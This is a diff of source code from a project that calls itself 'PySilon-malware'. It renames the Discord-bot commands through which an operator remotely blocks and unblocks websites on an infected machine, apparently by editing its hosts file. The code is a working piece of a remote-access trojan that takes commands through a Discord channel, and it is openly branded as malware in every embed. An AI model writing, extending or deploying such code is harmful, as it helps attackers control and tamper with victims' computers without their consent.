@@ -12,14 +12,14 @@ def get_hosts_file_path():
     return None
 
 # on message
-elif message.content[:9] == '.webblock':
+elif message.content[:14] == '.block-website':
     await message.delete()
-    if message.content.strip() == '.webblock':
-        embed = discord.Embed(title="📛 Error", description=f'```Syntax: .webblock <https://example.com>```', colour=discord.Colour.red())
+    if message.content.strip() == '.block-website':
+        embed = discord.Embed(title="📛 Error", description=f'```Syntax: .block-website <https://example.com>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await message.channel.send(embed=embed)
     else:
-        website = message.content[10:]
+        website = message.content[15:]
         await message.channel.send(website)
 
         parsed_url = urlparse(website)
@@ -38,14 +38,14 @@ elif message.content[:9] == '.webblock':
             embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
             await message.channel.send(embed=embed)
 
-elif message.content[:11] == '.webunblock':
+elif message.content[:16] == '.unblock-website':
     await message.delete()
-    if message.content.strip() == '.webunblock':
-        embed = discord.Embed(title="📛 Error", description=f'```Syntax: .webunblock <example.com>```', colour=discord.Colour.red())
+    if message.content.strip() == '.unblock-website':
+        embed = discord.Embed(title="📛 Error", description=f'```Syntax: .unblock-website <example.com>```', colour=discord.Colour.red())
         embed.set_author(name="PySilon-malware", icon_url="https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png")
         await message.channel.send(embed=embed)
     else:
-        website = message.content[12:]
+        website = message.content[17:]
 
         website = website.replace("https://", "")
         website = website.replace("http://", "")
